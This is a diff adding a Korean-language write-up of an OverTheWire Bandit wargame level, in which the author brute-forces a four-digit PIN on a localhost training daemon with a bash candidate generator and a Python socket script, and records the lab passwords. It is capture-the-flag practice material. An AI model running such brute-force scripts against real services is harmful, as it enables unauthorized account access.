@@ -272,3 +272,99 @@ cron을 사용할 때, 보안에 신경써야겠구나 싶기도하고 이렇게 비밀번호도 빼올 수 있�
 
 
 답 == UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#Bandit Level 24 → Level 25
+Level Goal)
+-A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. 
+-There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+#Bandit Level 24 → Level 25 풀이 과정)
+이건 뭐, 이제 명령어도 주지 않는다. 근데 지문만 보면 이제 어느정도 감이 잡힌다는게 다행.
+무차별대입이라는 공격으로 비밀번호를 알아내면 되는 것 같다. 일단 nmap으로 서버를 확인했다.
+nmap localhost -p 30002 ->
+PORT      STATE SERVICE
+30002/tcp open  pago-services2
+
+잘 열려있다. 일단 확인을 위해서 nc로 접속
+nc localhost 30002 ->
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+이라고 뜨며 실패하면 다시 시도해보라고 격려한다.
+음... 무차별 대입이란게 마구잡이로 대입해서 맞으면 로그인 시켜주는 역할인가보다.
+검색해봤더니 맞다.
+그래서 조금 봤더니, text파일에 비밀번호를 담고 하나하나 대입해가며 답을 찾는다고 나와있다.
+좋다. 나도 text파일을 만들면 되겠구나! 싶었다.
+스크립트 파일을 만들어보자.
+/tmp/ia 라이는 dir을 만들어 그 안에서 진행했다.
+
+touch pwdlist.txt ,
+vi pwdlist.sh ->
+#! /bin/bash
+for num in {0..9999}
+do
+    value=""
+    if [ "${#num}" == 1 ] 
+    then
+        value="000${num}"
+    elif [ "${#num}" == 2 ]
+    then
+        value="00${num}"
+    elif [ "${#num}" == 3 ]
+    then
+        value="0${num}"
+    else
+        value="${num}"
+    fi
+
+    password="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ${value}"
+    echo ${password} >> pwdlist.txt
+done
+
+하니까 비밀번호는 잘만들어져 pwdlist.txt에 잘들어갔다. 이제 이걸 대입하는 문제가 남았는데...
+이것도 스크립트 파일로 만들어보자고 생각했다.
+스크립트 파일에서 nc를 실행하고 하나하나 대입하면 되겠지?라는 생각으로 진행했다.
+그러나 실패... 스크립트로 반복하는데 무한대기를 받다가 타임아웃으로 시간지나면 다시 묻고 난리가 난다. 분명 스크립트에 대한 코딩이 문제란 건데,
+grep으로 Exiting, Wrong을 지워도 안된다.
+그래서 나온 해결책은
+python으로 해결하기.
+a.py 파일을 만들어 코딩을 했다.
+소켓으로 통신을 하면 그만이니까.
+vi a.py ->
+import socket
+HOST = '127.0.0.1'
+PORT = 30002
+
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_socket.connect((HOST, PORT))
+
+for num in range(0,10000):
+    pwd = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {0}\n ".format(num)
+
+    client_socket.sendall(pwd.encode())
+
+    data = client_socket.recv(1024)
+    if "Wrong" in data:
+
+        print('fail : ',num)
+    else:
+        print('success : ',repr(data.decode()))
+
+코드를 저장하고
+python a.py를 하니 비밀번호가 하나씩 대입이 된다. 그리고 2000번대쯤에서 답이 도출되었다.
+
+
+
+답 == uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
